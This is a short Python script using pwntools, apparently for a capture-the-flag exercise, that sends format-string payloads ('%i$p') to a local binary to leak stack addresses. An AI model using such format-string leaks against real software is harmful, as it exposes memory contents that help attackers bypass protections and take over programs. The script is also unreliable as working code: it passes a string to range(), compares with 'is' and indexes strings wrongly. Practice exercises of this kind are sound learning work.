from pwn import *
from sys import argv


addrs = []
with process("./challenge") as proc:
        counter = 0
        for i in range(argv[0]):
                payload = f"%{i}$p"

                proc.sendline(bytes(payload.encode()))
                output = proc.recvline().strip()
                data = f"index {i} -> {output} "

                if output is b"":
                        pass
                else:
                        counter += 1
                        addrs.append(data)

        for i in addrs:
                if i[2] is b"":
                        pass
                else:
                        print(i)
